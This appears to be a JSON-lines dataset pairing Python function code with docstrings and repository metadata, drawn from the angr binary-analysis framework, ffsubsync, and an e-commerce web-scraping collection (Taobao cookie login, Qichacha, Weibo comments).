{"docstring": "\"\"\"\nFit to data, then transform it.\nFits transformer to X and y with optional parameters fit_params\nand returns a transformed version of X.\nParameters\n----------\nX : ndarray of shape (n_samples, n_features)\n    Training set.\ny : ndarray of shape (n_samples,), default=None\n    Target values.\n**fit_params : dict\n    Additional fit parameters.\nReturns\n-------\nX_new : ndarray array of shape (n_samples, n_features_new)\n    Transformed array.\n\"\"\"\n# non-optimized default implementation; override when a better\n# method is possible for a given clustering algorithm\n", "func_signal": "def fit_transform(self, X, y=None, **fit_params):\n", "code": "if y is None:\n    # fit method of arity 1 (unsupervised transformation)\n    return self.fit(X, **fit_params).transform(X)\nelse:\n    # fit method of arity 2 (supervised transformation)\n    return self.fit(X, y, **fit_params).transform(X)", "path": "ffsubsync/ffsubsync/sklearn_shim.py", "commit_date": "2020-06-03 00:00:00", "repo_name": "smacke/ffsubsync", "stars": 6417, "license": "mit", "language": "python", "size": 3922}
{"docstring": "\"\"\"\nReturns the lineage of histories leading up to `h`.\n\"\"\"\n\n", "func_signal": "def lineage(self, h):\n", "code": "lineage = [ ]\n\npredecessors = list(self._graph.predecessors(h))\nwhile len(predecessors):\n    lineage.append(predecessors[0])\n    predecessors = list(self._graph.predecessors(predecessors[0]))\n\nlineage.reverse()\nreturn lineage", "path": "angr/angr/state_hierarchy.py", "commit_date": "2018-10-31 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "# Get all symbolic variables in memory\n", "func_signal": "def _concretize(self, memory, addr):\n", "code": "symbolic_vars = filter(lambda key: not key.startswith(\"reg_\") and not key.startswith(\"mem_\"), memory._name_mapping.keys())\ncontrolled_addrs = sorted([_addr for s_var in symbolic_vars for _addr in memory.addrs_for_name(s_var)])\ncontrolled_addrs.extend(self._fixed_addrs)\n\n# Represent controlled addresses in adjacent memory areas as \"base+offset\"\nbase_length_array = [(controlled_addrs[0], 0)]\nfor i in range(1, len(controlled_addrs)):\n    if controlled_addrs[i - 1] + 1 == controlled_addrs[i]:\n        base = base_length_array[i-1][0]\n    else:\n        base = controlled_addrs[i]\n\n    base_length_array.append((base, controlled_addrs[i] - base))\n\n# create intervals from memory areas\nintervals = [(t[0], len(list(t[1]))) for t in groupby(base_length_array, key=lambda t: t[0])]\n\nconstraints = []\n\n# create constraints from intervals\nfor base, length in intervals:\n   constraints.append(memory.state.solver.And(addr >= base, addr < base+length))\n\n# try to get solutions for controlled memory\nored_constraints = memory.state.solver.Or(*constraints)\nsolutions = self._eval(memory, addr, self._limit, extra_constraints=(ored_constraints,))\nif not solutions:\n    solutions = None\nreturn solutions", "path": "angr/angr/concretization_strategies/controlled_data.py", "commit_date": "2020-08-23 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nFind the \"most mergeable\" set of states from those provided.\n\n:param states: a list of states\n:returns: a tuple of: (a list of states to merge, those states' common history, a list of states to not merge yet)\n\"\"\"\n\n", "func_signal": "def most_mergeable(self, states):\n", "code": "histories = set(self.get_ref(s.history) for s in states)\n\nfor n in networkx.algorithms.dfs_postorder_nodes(self._graph):\n    intersection = histories.intersection(self.all_successors(n))\n    if len(intersection) > 1:\n        return (\n            [ s for s in states if self.get_ref(s.history) in intersection ],\n            n(),\n            [ s for s in states if self.get_ref(s.history) not in intersection ]\n        )\n\n# didn't find any?\nreturn set(), None, states", "path": "angr/angr/state_hierarchy.py", "commit_date": "2018-10-31 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "# The New Order\n", "func_signal": "def __init__(self):\n", "code": "        self._graph = networkx.DiGraph()\n        self._leaves = set() # nodes with no children\n        self._twigs = set() # nodes with one child\n        self._weakref_cache = {} # map from object id to weakref\n        self._reverse_weakref_cache = {} # map from weakref to object id", "path": "angr/angr/state_hierarchy.py", "commit_date": "2018-10-31 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nReturn the function who has the least address that is greater than or equal to `addr`.\n\n:param int addr: The address to query.\n:return:         A Function instance, or None if there is no other function after `addr`.\n:rtype:          Function or None\n\"\"\"\n\n", "func_signal": "def ceiling_func(self, addr):\n", "code": "try:\n    next_addr = self._function_map.ceiling_addr(addr)\n    return self._function_map.get(next_addr)\n\nexcept KeyError:\n    return None", "path": "angr/angr/knowledge_plugins/functions/function_manager.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "# Note that you will never return to a syscall\n\n", "func_signal": "def _add_return_from_call(self, function_addr, src_function_addr, to_node, to_outside=False):\n", "code": "        if type(to_node) is int:  # pylint: disable=unidiomatic-typecheck\n            to_node = self._kb._project.factory.snippet(to_node)\n        func = self._function_map[function_addr]\n        src_func = self._function_map[src_function_addr]\n        func._return_from_call(src_func, to_node, to_outside=to_outside)", "path": "angr/angr/knowledge_plugins/functions/function_manager.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "# a thought: we could support mapping pages in multiple places in memory if here we just kept a set of released\n# page ids and never released any page more than once\n", "func_signal": "def __del__(self):\n", "code": "for page in self._pages.values():\n    if page is not None:\n        page.release_shared()", "path": "angr/angr/storage/memory_mixins/paged_memory/paged_memory_mixin.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "# the logical flow of this shit is so confusing. this should be more compact and efficient than the old\n# simmemory model but it will require a bit of writing to solidify the contracts and allow someone\n# reading this function to actually believe that it is correctly implemented\n", "func_signal": "def _map_page(self, pageno, permissions, init_zero=False, **kwargs):\n", "code": "try:\n    self._get_page(pageno, False, allow_default=False, **kwargs)\nexcept SimMemoryError:\n    pass  # good, expected error\nelse:\n    raise SimMemoryError(\"Page is already mapped\")\n\npage = self._initialize_default_page(pageno, permissions=permissions, **kwargs)\nself._pages[pageno] = page\nif init_zero:\n    page.store(0, None, size=self.page_size, endness='Iend_BE', page_addr=pageno*self.page_size, memory=self,\n               **kwargs)", "path": "angr/angr/storage/memory_mixins/paged_memory/paged_memory_mixin.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nGet the latest available job.\n\n:return: The latest available job.\n\"\"\"\n\n", "func_signal": "def job(self):\n", "code": "job, _ = self.jobs[-1]\nreturn job", "path": "angr/angr/analyses/forward_analysis/job_info.py", "commit_date": "2019-09-09 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "# TODO we don't check the return val, some cases I saw char * strcpy, some size_t strcpy\n", "func_signal": "def gen_input_output_pair(self):\n", "code": "strlen = random.randint(1, 80)\nbuf = rand_str(strlen, byte_list=strcpy.non_null) + b\"\\x00\"\nresult_buf = rand_str(strlen+1)\ntest_input = [result_buf, buf]\ntest_output = [buf, buf]\nmax_steps = 20\nreturn_val = None\ntest = TestData(test_input, test_output, return_val, max_steps)\nreturn test", "path": "angr/angr/analyses/identifier/functions/strcpy.py", "commit_date": "2018-08-04 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nGenerate a sif file from the call map.\n\n:param filepath:    Path of the sif file\n:return:            None\n\"\"\"\n", "func_signal": "def _genenare_callmap_sif(self, filepath):\n", "code": "with open(filepath, \"wb\") as f:\n    for src, dst in self.callgraph.edges():\n        f.write(\"%#x\\tDirectEdge\\t%#x\\n\" % (src, dst))", "path": "angr/angr/knowledge_plugins/functions/function_manager.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nGet a function object from the function manager.\n\nPass either `addr` or `name` with the appropriate values.\n\n:param int addr: Address of the function.\n:param str name: Name of the function.\n:param bool create: Whether to create the function or not if the function does not exist.\n:param bool syscall: True to create the function as a syscall, False otherwise.\n:param bool or None plt: True to find the PLT stub, False to find a non-PLT stub, None to disable this\n                         restriction.\n:return: The Function instance, or None if the function is not found and create is False.\n:rtype: Function or None\n\"\"\"\n", "func_signal": "def function(self, addr=None, name=None, create=False, syscall=False, plt=None) -> Optional[Function]:\n", "code": "if addr is not None:\n    try:\n        f = self._function_map.get(addr)\n        if plt is None or f.is_plt == plt:\n            return f\n    except KeyError:\n        if create:\n            # the function is not found\n            f = self._function_map[addr]\n            if name is not None:\n                f.name = name\n            if syscall:\n                f.is_syscall=True\n            return f\nelif name is not None:\n    for func in self._function_map.values():\n        if func.name == name:\n            if plt is None or func.is_plt == plt:\n                return func\n\nreturn None", "path": "angr/angr/knowledge_plugins/functions/function_manager.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nAppended a new job to this JobInfo node.\n:param job: The new job to append.\n:param bool merged: Whether it is a merged job or not.\n:param bool widened: Whether it is a widened job or not.\n\"\"\"\n\n", "func_signal": "def add_job(self, job, merged=False, widened=False):\n", "code": "job_type = ''\nif merged:\n    job_type = 'merged'\nelif widened:\n    job_type = 'widened'\nself.jobs.append((job, job_type))", "path": "angr/angr/analyses/forward_analysis/job_info.py", "commit_date": "2019-09-09 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\n:param flag_page:   Flag page content, either a string or a list of BV8s\n\"\"\"\n# default stack as specified in the cgc abi\n", "func_signal": "def state_blank(self, flag_page=None, **kwargs):\n", "code": "if kwargs.get('stack_end', None) is None:\n    kwargs['stack_end'] = 0xbaaab000\nif kwargs.get('stack_size', None) is None:\n    kwargs['stack_size'] = 1024*1024*8\n\ns = super(SimCGC, self).state_blank(**kwargs)  # pylint:disable=invalid-name\n\n# pre-grow the stack by 20 pages. unsure if this is strictly required or just a hack around a compiler bug\nfor i in range(20):\n    s.memory.load(kwargs['stack_end'] - 4 - i * 0x1000, size=4, endness='Iend_LE')\n\n# Map the flag page\nif o.ABSTRACT_MEMORY not in s.options:\n    s.memory.map_region(0x4347c000, 4096, 1)\n\n# Create the CGC plugin\ns.get_plugin('cgc')\n\n# Set up the flag page\nif flag_page is None:\n    flag_page = [s.solver.BVS(\"cgc-flag-byte-%d\" % i, 8, key=('flag', i), eternal=True) for i in range(0x1000)]\nelif type(flag_page) is bytes:\n    flag_page = [s.solver.BVV(c, 8) for c in flag_page]\nelif type(flag_page) is list:\n    pass\nelse:\n    raise ValueError(\"Bad flag page: expected None, bytestring, or list, but got %s\" % type(flag_page))\n\ns.cgc.flag_bytes = flag_page\nif s.mode != 'static':\n    s.memory.store(0x4347c000, claripy.Concat(*s.cgc.flag_bytes), priv=True)\n\n# set up the address for concrete transmits\ns.unicorn.transmit_addr = self.syscall_from_number(2).addr\n\ns.libc.max_str_len = 1000000\ns.libc.max_strtol_len = 10\ns.libc.max_memcpy_size = 0x100000\ns.libc.max_buffer_size = 0x100000\n\nreturn s", "path": "angr/angr/simos/cgc.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nResolves the indirect jump in ARM ELF binaries where all internal function calls are performed in the following\nmanner:\n\nldr r3, [pc+#0x124]  ; load a constant from the constant_pool\nblx r3\n\n:param cfg:             A CFG instance.\n:param int addr:        Address of the IRSB.\n:param int func_addr:   Address of the function.\n:param block:           The IRSB.\n:param str jumpkind:    The jumpkind.\n:return:\n:rtype:                 tuple\n\"\"\"\n\n# Note that this function assumes the IRSB is optimized (opt_level > 0)\n# the logic will be vastly different if the IRSB is not optimized (opt_level == 0)\n\n", "func_signal": "def resolve(self, cfg, addr, func_addr, block, jumpkind):\n", "code": "b = Blade(cfg.graph, addr, -1, cfg=cfg, project=self.project, ignore_sp=True, ignore_bp=True, max_level=2)\nsources = [ n for n in b.slice.nodes() if b.slice.in_degree(n) == 0 ]\nif not sources:\n    return False, [ ]\n\nif len(sources) != 1:\n    return False, [ ]\n\nsource = sources[0]\nblock_addr, stmt_idx = source\n\nif block_addr != block.addr:\n    # TODO: We should be able to support this case very easily\n    # TODO: Fix it when we see such a case\n    return False, [ ]\n\nstmt = block.statements[stmt_idx]\nif not isinstance(stmt, pyvex.IRStmt.WrTmp):\n    return False, [ ]\nif not isinstance(stmt.data, pyvex.IRExpr.Load):\n    return False, [ ]\nif not isinstance(stmt.data.addr, pyvex.IRExpr.Const):\n    return False, [ ]\nload_addr = stmt.data.addr.con.value\nload_size = stmt.data.result_size(block.tyenv) // 8\nendness = archinfo.Endness.BE if stmt.data.endness == 'Iend_BE' else archinfo.Endness.LE\n\n# the next statement should be the default exit\nnext_target = next(iter(b.slice.successors(source)))\n\nif not (next_target[0] == block.addr and next_target[1] == DEFAULT_STATEMENT):\n    return False, [ ]\nnext_tmp = block.next\nif next_tmp.tmp != stmt.tmp:\n    return False, [ ]\n\n# load the address to jump to\ntry:\n    target_addr = self.project.loader.memory.unpack_word(load_addr, size=load_size, endness=endness)\n    if cfg.tag == \"CFGFast\":\n        cfg._seg_list.occupy(load_addr, load_size, \"pointer-array\")\nexcept KeyError:\n    return False, [ ]\n\nreturn True, [ target_addr ]", "path": "angr/angr/analyses/cfg/indirect_jump_resolvers/arm_elf_fast.py", "commit_date": "2020-04-28 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "# permissions lookup: let permissions arg override everything else\n# then try the permissions map\n# then fall back to the default permissions\n", "func_signal": "def _page_kwargs(self, pageno, permissions):\n", "code": "if permissions is None:\n    permissions = self._default_permissions\n    addr = pageno * self.page_size\n\n    for (start, end), perms in self._permissions_map.items():\n        if start <= addr <= end:\n            permissions = perms\n            break\n\nreturn dict(\n    memory=self,\n    memory_id='%s_%d' % (self.id, pageno),\n    permissions=permissions,\n    **self._extra_page_kwargs\n)", "path": "angr/angr/storage/memory_mixins/paged_memory/paged_memory_mixin.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "# Check the first block and see if there is any statement reading data from fs:0x28h\n", "func_signal": "def _check(self):\n", "code": "init_stmt = self._find_canary_init_stmt()\n\nreturn init_stmt is not None, {'init_stmt': init_stmt}", "path": "angr/angr/analyses/decompiler/optimization_passes/stack_canary_simplifier.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nFlush all pages not included in the `white_list` by removing their pages. Note, this will not wipe them\nfrom memory if they were backed by a memory_backer, it will simply reset them to their initial state.\nReturns the list of pages that were cleared consisting of `(addr, length)` tuples.\n:param white_list: white list of regions in the form of (start, end) to exclude from the flush\n:return: a list of memory page ranges that were flushed\n:rtype: list\n\"\"\"\n", "func_signal": "def flush_pages(self, white_list):\n", "code": "white_list_page_number = []\n\nfor addr in white_list:\n    for page_addr in range(addr[0], addr[1], self.page_size):\n        pageno, _ = self.state.memory._divide_addr(page_addr)\n        white_list_page_number.append(pageno)\n\nnew_page_dict = {}\nflushed = []\n\n# cycle over all the keys ( the page number )\nfor pageno, page in self._pages.items():\n    if pageno in white_list_page_number:\n        #l.warning(\"Page \" + str(pageno) + \" not flushed!\")\n        new_page_dict[pageno] = page\n    else:\n        #l.warning(\"Page \" + str(pageno) + \" flushed!\")\n        flushed.append((pageno, self.page_size))\nself._pages = new_page_dict\nreturn flushed", "path": "angr/angr/storage/memory_mixins/paged_memory/paged_memory_mixin.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nThe implementation here is simple - just perform a pattern matching of all different architectures we support,\nand then perform a vote.\n\"\"\"\n# Retrieve the binary string of main binary\n", "func_signal": "def _reconnoiter(self):\n", "code": "votes = defaultdict(int)\n\nfor arch in all_arches:\n    regexes = set()\n    if not arch.function_prologs:\n        continue\n    # TODO: BoyScout does not support Thumb-only / Cortex-M binaries yet.\n\n    for ins_regex in set(arch.function_prologs).union(arch.function_epilogs):\n        r = re.compile(ins_regex)\n        regexes.add(r)\n\n    for start_, data in self.project.loader.main_object.memory.backers():\n        for regex in regexes:\n            # Match them!\n            for mo in regex.finditer(data):\n                position = mo.start() + start_\n                if position % arch.instruction_alignment == 0:\n                    votes[(arch.name, arch.memory_endness)] += 1\n\n    l.debug(\"%s %s hits %d times\", arch.name, arch.memory_endness,\n            votes[(arch.name, arch.memory_endness)])\n\narch_name, endianness, hits = sorted([(k[0], k[1], v) for k, v in votes.items()], key=lambda x: x[2], reverse=True)[0]\n\nif hits < self.cookiesize * 2:\n# this cannot possibly be code\n    arch_name = \"DATA\"\n    endianness = \"\"\n\nself.arch = arch_name\nself.endianness = endianness\n# Save it as well for debugging\nself.votes = votes\n\nl.debug(\"The architecture should be %s with %s\", self.arch, self.endianness)", "path": "angr/angr/analyses/boyscout.py", "commit_date": "2019-03-30 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "\"\"\"\nReturn the function who has the greatest address that is less than or equal to `addr`.\n\n:param int addr: The address to query.\n:return:         A Function instance, or None if there is no other function before `addr`.\n:rtype:          Function or None\n\"\"\"\n\n", "func_signal": "def floor_func(self, addr):\n", "code": "try:\n    prev_addr = self._function_map.floor_addr(addr)\n    return self._function_map[prev_addr]\n\nexcept KeyError:\n    return None", "path": "angr/angr/knowledge_plugins/functions/function_manager.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "angr/angr", "stars": 7096, "license": "bsd-2-clause", "language": "python", "size": 56985}
{"docstring": "'''\n\u68c0\u67e5\u6587\u4ef6\u8def\u5f84\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u5b58\u5728\u5c31\u521b\u9020\u4e00\u4e2a\uff0c\u5b58\u5728\u540e\u5b9a\u4e49self\u4fdd\u5b58\u8def\u5f84\n:param input_path: \u4f20\u5165\u7684\u8def\u5f84\n:return:  self \u4fdd\u5b58\u8def\u5f84\n'''\n", "func_signal": "def _is_input_path(self,input_path):\n", "code": "if not os.path.exists(input_path):  # \u8def\u5f84\u51fd\u6570\n    self.save_path = os.path.join(self.base_path, 'titles')\n    if not os.path.exists(self.save_path):\n        os.makedirs(self.save_path)\nelse:\n    self.save_path = input_path\n    print('\u5b58\u5728\u81ea\u5b9a\u4e49\u8def\u5f84')\n    # self.errMessage.put('\u3010\u5bfc\u51fa\u6587\u4ef6\u3011\u81ea\u5b9a\u4e49\u8def\u5f84')", "path": "ECommerceCrawlers/OthertCrawler/0x11zzc/export_title.py", "commit_date": "2019-06-25 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "\"\"\"\nTest if cookies can work.\n:return: if cookies words, return True, else False\n\"\"\"\n", "func_signal": "def test(self):\n", "code": "while True:\n    unlogin = self.__get_nologin()\n    print('nologin', unlogin)\n    if unlogin is None:\n        self.errMessage.put('\u6ca1\u6709\u65e0\u767b\u5f55\u7684cookie')\n        print('\u6ca1\u6709\u65e0\u767b\u5f55\u7684cookie')\n        time.sleep(5)\n    else:\n        user =unlogin.get('user')\n        self.__get_newLogin(user=user)\n\n\n    q = self.__get_invcookies()\n    print('cookie',q)\n    if q is None:\n        print('\u6ca1\u6709\u65e0\u6548\u7684cookie')\n        self.errMessage.put('\u6ca1\u6709\u65e0\u6548\u7684cookie')\n        self.logger.debug('\u6ca1\u6709\u65e0\u6548\u7684cookie')\n        time.sleep(5)\n        continue\n    else:\n        cookies =q.get('cookies')\n        self.user = q.get('user')\n        self.errMessage.put('\u9a8c\u8bc1{}\u7684cookie'.format(self.user))\n        self._check_login_by_cookie(self.url,cookies=cookies)", "path": "ECommerceCrawlers/TaobaoCrawler/listen.py", "commit_date": "2019-05-18 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# \u5224\u65ad\\\u65b0\u5efa\u6587\u4ef6\u5939\n", "func_signal": "def work(self):\n", "code": "if not os.path.exists(self.path):\n    os.makedirs(self.path)\n    log(self.path+' \u6587\u4ef6\u5939\u521b\u5efa\u6210\u529f')\n\n# \u5224\u65ad\\\u65b0\u5efa\u6587\u4ef6\nif not os.path.exists(self.file_name):\n    header = ['province', 'city', 'county', 'park', 'area', 'numcop', 'company',\n              'person', 'capital', 'settime', 'email', 'phone', 'address', 'state', 'url']\n    with open(self.file_name, 'a', newline='', encoding='utf-8') as f:\n        writer = csv.writer(f)\n        writer.writerow(header)\n\nfor i in range(self.length):\n    self.ListTask.append(i)\n\nthreads = []\nfor i in range(200):\n    thread = threading.Thread(target=self.thread_task, args=())\n    threads.append(thread)\n\n# \u542f\u52a8\u591a\u7ebf\u7a0b\nfor t in threads:\n    t.start()\n    log('\u5f00\u542f\u7ebf\u7a0b: '+t.name)\n\nfor t in threads:\n    t.join()\n    log('\u5173\u95ed\u7ebf\u7a0b: '+t.name)\n\nlog('\u4e3b\u7ebf\u7a0b\u7ed3\u675f\uff01 '+threading.current_thread().name)", "path": "ECommerceCrawlers/QiChaCha/get_parks_companies_threads.py", "commit_date": "2020-03-03 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "\"\"\"\nAdd cookies to browser if exist.\n:return:\n\"\"\"\n", "func_signal": "def add_cookies(self):\n", "code": "if self.cookies:\n    for d in self.cookies:\n        self.browser.add_cookie(d)", "path": "ECommerceCrawlers/TaobaoCrawler/login.py", "commit_date": "2019-05-18 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# Called with the start requests of the spider, and works\n# similarly to the process_spider_output() method, except\n# that it doesn\u2019t have a response associated.\n\n# Must return only requests (not items).\n", "func_signal": "def process_start_requests(start_requests, spider):\n", "code": "for r in start_requests:\n    yield r", "path": "ECommerceCrawlers/East_money/east_money/middlewares.py", "commit_date": "2019-08-17 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "\"\"\"\nGet cookies from db.\n:return: if exist return True, else False\n\"\"\"\n", "func_signal": "def get_cookie(self):\n", "code": "cookie = self.db.get_cookies(flag=1)\nif cookie:\n    return cookie", "path": "ECommerceCrawlers/TaobaoCrawler/login.py", "commit_date": "2019-05-18 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "\"\"\"\nGet cookies\n:return: if cookies exist, return cookie, else return None\n\"\"\"\n", "func_signal": "def get_cookies(self,flag):\n", "code": "q = self.cookie_set.find_one({\"flag\":flag})\nif q:\n    return q\nelse:\n    return None", "path": "ECommerceCrawlers/TaobaoCrawler/dbcookie.py", "commit_date": "2019-05-18 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# This method is used by Scrapy to create your spiders.\n", "func_signal": "def from_crawler(cls, crawler):\n", "code": "s = cls()\ncrawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\nreturn s", "path": "ECommerceCrawlers/East_money/east_money/middlewares.py", "commit_date": "2019-08-17 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "\"\"\"\n\u5207\u6362\u5230\u5bc6\u7801\u6a21\u5f0f\n:return:\n\"\"\"\n", "func_signal": "def switch_to_password_mode(self):\n", "code": "self.errMessage.put('\u5207\u6362\u81f3\u5bc6\u7801\u767b\u5f55')\npassword_login = self.wait.until(\n    EC.presence_of_element_located((By.CSS_SELECTOR, '.qrcode-login > .login-links > .forget-pwd')))\npassword_login.click()", "path": "ECommerceCrawlers/TaobaoCrawler/login.py", "commit_date": "2019-05-18 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "\"\"\"\n\u751f\u6210\u4e00\u4e2a\u6307\u5b9a\u957f\u5ea6\u7684\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u5176\u4e2d\nstring.digits=0123456789\nstring.ascii_letters=abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\n\"\"\"\n", "func_signal": "def generate_random_str(self, randomlength=6):\n", "code": "str_list = [random.choice(string.digits + string.ascii_letters) for i in range(randomlength)]\nrandom_str = ''.join(str_list)\nreturn random_str", "path": "ECommerceCrawlers/OthertCrawler/0x11zzc/zz_spider.py", "commit_date": "2019-06-25 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# \u7528cookie\u7684\u65b9\u5f0f\u767b\u5f55\n", "func_signal": "def _check_login_by_cookie(self, url, cookies):\n", "code": "try:\n    self.browser.delete_all_cookies()\n\n    for cookie in cookies:\n        self.browser.add_cookie({k: v for k, v in cookie.items()})\nexcept Exception as e:\n    print('\u6ce8\u5165cookie\u9519\u8bef')\n    pass\nself.browser.get(url)\n\nself.check_security()", "path": "ECommerceCrawlers/TaobaoCrawler/listen.py", "commit_date": "2019-05-18 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "'''\n\u63d0\u53d6\u6570\u636e\uff0c\u653e\u5165\u961f\u5217\u4e2d\n:param data:\n:return:\n'''\n", "func_signal": "def clean_data(self, data):\n", "code": "for i in data:\n    app = {}\n    app['ID'] = i.get('appId')\n    app['\u5e94\u7528\u540d\u79f0'] = i.get('displayName')\n    app['\u4e0b\u8f7d\u94fe\u63a5'] = self.base_download + str(i.get('appId'))\n    self.queue.put(app)", "path": "ECommerceCrawlers/OthertCrawler/0x15xiaomiappshop/xiaomishop.py", "commit_date": "2019-12-25 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# \u8f93\u5165\u6765\u81ea\u5fae\u535a\u91c7\u96c6\u7684\u535a\u5ba2url\u94fe\u63a5\uff0c\u6240\u6709\u8bc4\u8bba\u4fdd\u5b58\u5bf9\u5e94\u94fe\u63a5\u7684xlsx\n\n", "func_signal": "def run(url):\n", "code": "m_id = 0\nid_type = 0\nmid=url_to_mid(url=url)\njsondata = get_page(m_id, id_type,mid=mid)\nresults = parse_page(jsondata)\nmaxpage = results['max']\nprint('\u591a\u5c11\u9875',maxpage)\nfor page in range(maxpage):\n    print('\u91c7\u96c6\u7b2c{}\u9875\u7684\u5fae\u535a'.format(page))\n    jsondata = get_page(m_id, id_type,mid)\n    print(jsondata)\n    write_csv(jsondata)\n    results = parse_page(jsondata)\n    time.sleep(random.randint(2,4))\n    wb.save('{}.xlsx'.format(url))\n    if page%30==0:\n        time.sleep(6)\n    m_id = results['max_id']\n    id_type = results['max_id_type']\nwb.save('{}.xlsx'.format(url))", "path": "ECommerceCrawlers/WeiboCrawler/comment/weibo_comment.py", "commit_date": "2020-03-03 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# Called with the results returned from the Spider, after\n# it has processed the response.\n\n# Must return an iterable of Request, dict or Item objects.\n", "func_signal": "def process_spider_output(response, result, spider):\n", "code": "for i in result:\n    yield i", "path": "ECommerceCrawlers/East_money/east_money/middlewares.py", "commit_date": "2019-08-17 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
{"docstring": "# \u7b80\u5355\u68c0\u6d4b\u7528\u6237\u662f\u5426\u6709\u7528\u6237\u540d\u767b\u5f55\uff0c\u4e0d\u51c6\n", "func_signal": "def is_username(self, short=False):\n", "code": "try:\n    if short:\n        taobao_name = self.short_wait.until(EC.presence_of_element_located((By.CSS_SELECTOR,\n                                                                            '.site-nav-bd > ul.site-nav-bd-l > li#J_SiteNavLogin > div.site-nav-menu-hd > div.site-nav-user > a.site-nav-login-info-nick ')))\n    else:\n        taobao_name = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR,\n                                                                      '.site-nav-bd > ul.site-nav-bd-l > li#J_SiteNavLogin > div.site-nav-menu-hd > div.site-nav-user > a.site-nav-login-info-nick ')))\n    return taobao_name.text\nexcept Exception as e:\n    return ''", "path": "ECommerceCrawlers/TaobaoCrawler/listen.py", "commit_date": "2019-05-18 00:00:00", "repo_name": "DropsDevopsOrg/ECommerceCrawlers", "stars": 4319, "license": "mit", "language": "python", "size": 7934}
